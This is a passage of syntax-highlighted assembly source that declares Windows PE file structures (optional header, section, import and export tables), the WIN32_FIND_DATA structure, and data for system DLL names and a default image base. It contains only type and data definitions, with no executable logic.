</span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">            </span><span class="sc1">; All directories</span><span class="sc0">
</span><span class="sc5">DE_Export</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Import</span><span class="sc0">       </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Resource</span><span class="sc0">     </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Exception</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Security</span><span class="sc0">     </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_BaseReloc</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Debug</span><span class="sc0">        </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_Copyright</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_GlobalPtr</span><span class="sc0">    </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_TLS</span><span class="sc0">          </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_LoadConfig</span><span class="sc0">   </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_BoundImport</span><span class="sc0">  </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DE_IAT</span><span class="sc0">          </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                                         </span><span class="sc1">;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                        </span><span class="sc1">; Optional Header</span><span class="sc0">
</span><span class="sc5">OH_Magic</span><span class="sc0">                        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Magic word</span><span class="sc0">
</span><span class="sc5">OH_MajorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Linker version</span><span class="sc0">
</span><span class="sc5">OH_MinorLinkerVersion</span><span class="sc0">           </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Linker version</span><span class="sc0">
</span><span class="sc5">OH_SizeOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of code section</span><span class="sc0">
</span><span class="sc5">OH_SizeOfInitializedData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Initialized Data</span><span class="sc0">
</span><span class="sc5">OH_SizeOfUninitializedData</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Uninitialized Data</span><span class="sc0">
</span><span class="sc5">OH_AddressOfEntryPoint</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Initial EIP</span><span class="sc0">
</span><span class="sc5">OH_BaseOfCode</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Code Virtual Address</span><span class="sc0">
</span><span class="sc5">OH_BaseOfData</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Data Virtual Address</span><span class="sc0">
</span><span class="sc5">OH_ImageBase</span><span class="sc0">                    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Base of image</span><span class="sc0">
</span><span class="sc5">OH_SectionAlignment</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Section Alignment</span><span class="sc0">
</span><span class="sc5">OH_FileAlignment</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; File Alignment</span><span class="sc0">
</span><span class="sc5">OH_MajorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major OS</span><span class="sc0">
</span><span class="sc5">OH_MinorOperatingSystemVersion</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor OS</span><span class="sc0">
</span><span class="sc5">OH_MajorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Image version</span><span class="sc0">
</span><span class="sc5">OH_MinorImageVersion</span><span class="sc0">            </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Image version</span><span class="sc0">
</span><span class="sc5">OH_MajorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Major Subsys version</span><span class="sc0">
</span><span class="sc5">OH_MinorSubsystemVersion</span><span class="sc0">        </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Minor Subsys version</span><span class="sc0">
</span><span class="sc5">OH_Win32VersionValue</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; win32 version</span><span class="sc0">
</span><span class="sc5">OH_SizeOfImage</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of image</span><span class="sc0">
</span><span class="sc5">OH_SizeOfHeaders</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Size of Header</span><span class="sc0">
</span><span class="sc5">OH_CheckSum</span><span class="sc0">                     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; unused</span><span class="sc0">
</span><span class="sc5">OH_Subsystem</span><span class="sc0">                    </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Subsystem</span><span class="sc0">
</span><span class="sc5">OH_DllCharacteristics</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; DLL characteristic</span><span class="sc0">
</span><span class="sc5">OH_SizeOfStackReserve</span><span class="sc0">           </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack reserve</span><span class="sc0">
</span><span class="sc5">OH_SizeOfStackCommit</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Stack commit</span><span class="sc0">
</span><span class="sc5">OH_SizeOfHeapReserve</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Heap reserve</span><span class="sc0">
</span><span class="sc5">OH_SizeOfHeapCommit</span><span class="sc0">             </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Heap commit</span><span class="sc0">
</span><span class="sc5">OH_LoaderFlags</span><span class="sc0">                  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Loader flags</span><span class="sc0">
</span><span class="sc5">OH_NumberOfRvaAndSizes</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Number of directories</span><span class="sc0">
                                </span><span class="sc9">UNION</span><span class="sc0">          </span><span class="sc1">; directory entries</span><span class="sc0">
</span><span class="sc5">OH_DataDirectory</span><span class="sc0">                </span><span class="sc5">IMAGE_DATA_DIRECTORY\
</span><span class="sc0">                                </span><span class="sc5">IMAGE_NUMBEROF_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">OH_DirectoryEntries</span><span class="sc0">             </span><span class="sc5">IMAGE_DIRECTORY_ENTRIES</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
                                </span><span class="sc9">ENDS</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_OPTIONAL_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_OPTIONAL_HEADER</span><span class="sc0">
                                               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                     </span><span class="sc1">; Section hdr.</span><span class="sc0">
</span><span class="sc5">SH_Name</span><span class="sc0">                 </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; name</span><span class="sc0">
                        </span><span class="sc9">UNION</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SH_PhysicalAddress</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Physical address</span><span class="sc0">
</span><span class="sc5">SH_VirtualSize</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; Virtual size</span><span class="sc0">
                        </span><span class="sc9">ENDS</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">SH_VirtualAddress</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; Virtual address</span><span class="sc0">
</span><span class="sc5">SH_SizeOfRawData</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; Raw data size</span><span class="sc0">
</span><span class="sc5">SH_PointerToRawData</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; pointer to raw data</span><span class="sc0">
</span><span class="sc5">SH_PointerToRelocations</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc5">SH_PointerToLinenumbers</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; ...... not really used</span><span class="sc0">
</span><span class="sc5">SH_NumberOfRelocations</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; ....</span><span class="sc0">
</span><span class="sc5">SH_NumberOfLinenumbers</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; ..</span><span class="sc0">
</span><span class="sc5">SH_Characteristics</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                   </span><span class="sc1">; flags</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_SECTION_HEADER_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_SECTION_HEADER</span><span class="sc0">
                                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_BY_NAME</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                  </span><span class="sc1">; Import by name data type</span><span class="sc0">
</span><span class="sc5">IBN_Hint</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">; Hint entry</span><span class="sc0">
</span><span class="sc5">IBN_Name</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">; name</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_BY_NAME</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                      </span><span class="sc1">; Thunk data</span><span class="sc0">
                    </span><span class="sc9">UNION</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TD_AddressOfData</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_BY_NAME</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Ptr to IMAGE_IMPORT_BY_NAME structure</span><span class="sc0">
</span><span class="sc5">TD_Ordinal</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                    </span><span class="sc1">; Ordinal ORed with IMAGE_ORDINAL_FLAG</span><span class="sc0">
</span><span class="sc5">TD_Function</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Ptr to function (i.e. Function address after program load)</span><span class="sc0">
</span><span class="sc5">TD_ForwarderString</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Ptr to a forwarded API function.</span><span class="sc0">
                    </span><span class="sc9">ENDS</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">               </span><span class="sc1">;;;;;;;;;</span><span class="sc0">
                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">       </span><span class="sc1">; Import descryptor</span><span class="sc0">
                      </span><span class="sc9">UNION</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ID_Characteristics</span><span class="sc0">    </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; 0 for last null import descriptor</span><span class="sc0">
</span><span class="sc5">ID_OriginalFirstThunk</span><span class="sc0"> </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; RVA to original unbound IAT</span><span class="sc0">
                      </span><span class="sc9">ENDS</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ID_TimeDateStamp</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ID_ForwarderChain</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">          </span><span class="sc1">; -1 if no forwarders</span><span class="sc0">
</span><span class="sc5">ID_Name</span><span class="sc0">               </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; RVA to name of imported DLL</span><span class="sc0">
</span><span class="sc5">ID_FirstThunk</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc5">IMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; RVA to IAT</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">

</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc9">STRUC</span><span class="sc0">                </span><span class="sc1">; Export Directory type</span><span class="sc0">
</span><span class="sc5">ED_Characteristics</span><span class="sc0">        </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Flags</span><span class="sc0">
</span><span class="sc5">ED_TimeDateStamp</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Date / Time</span><span class="sc0">
</span><span class="sc5">ED_MajorVersion</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Major version</span><span class="sc0">
</span><span class="sc5">ED_MinorVersion</span><span class="sc0">           </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; Minor version</span><span class="sc0">
</span><span class="sc5">ED_Name</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Ptr to name of exported DLL</span><span class="sc0">
                          </span><span class="sc9">UNION</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_Base</span><span class="sc0">                   </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc5">ED_BaseOrdinal</span><span class="sc0">            </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; base ordinal</span><span class="sc0">
                          </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_NumberOfFunctions</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of exported funcs.</span><span class="sc0">
                          </span><span class="sc9">UNION</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_NumberOfNames</span><span class="sc0">          </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of exported names</span><span class="sc0">
</span><span class="sc5">ED_NumberOfOrdinals</span><span class="sc0">       </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; number of exported ordinals</span><span class="sc0">
                          </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_AddressOfFunctions</span><span class="sc0">     </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Ptr to array of function addresses</span><span class="sc0">
</span><span class="sc5">ED_AddressOfNames</span><span class="sc0">         </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0"> </span><span class="sc1">; Ptr to array of (function) name addresses</span><span class="sc0">
                          </span><span class="sc9">UNION</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ED_AddressOfNameOrdinals</span><span class="sc0">  </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Ptr to array of name ordinals</span><span class="sc0">
</span><span class="sc5">ED_AddressOfOrdinals</span><span class="sc0">      </span><span class="sc9">DD</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">  </span><span class="sc1">; Ptr to array of ordinals</span><span class="sc0">
                          </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IMAGE_EXPORT_DIRECTORY</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">filetime</span><span class="sc0">                </span><span class="sc9">STRUC</span><span class="sc0">             </span><span class="sc1">; filetime structure</span><span class="sc0">
</span><span class="sc5">FT_dwLowDateTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FT_dwHighDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filetime</span><span class="sc0">                </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">         </span><span class="sc9">STRUC</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FileAttributes</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; attributes</span><span class="sc0">
</span><span class="sc5">CreationTime</span><span class="sc0">            </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; time of creation</span><span class="sc0">
</span><span class="sc5">LastAccessTime</span><span class="sc0">          </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; last access time</span><span class="sc0">
</span><span class="sc5">LastWriteTime</span><span class="sc0">           </span><span class="sc5">filetime</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; last modificationm</span><span class="sc0">
</span><span class="sc5">FileSizeHigh</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; filesize</span><span class="sc0">
</span><span class="sc5">FileSizeLow</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">; -"-</span><span class="sc0">
</span><span class="sc5">Reserved0</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">Reserved1_</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FileName</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; long filename</span><span class="sc0">
</span><span class="sc5">AlternateFileName</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; short filename</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">; dword padding</span><span class="sc0">
</span><span class="sc5">win32_find_data</span><span class="sc0">         </span><span class="sc9">ENDS</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">MAX_PATH</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">k32</span><span class="sc0">                             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">kernel32_name</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Kernel32.DLL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">advapi32_name</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ADVAPI32.dll"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">user32_name</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"USER32.dll"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">gdi32_name</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GDI32.dll"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">newimagebase</span><span class="sc0">                    </span><span class="sc9">label</span><span class="sc0">
</span><span class="sc5">imagebase</span><span class="sc0">                       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">
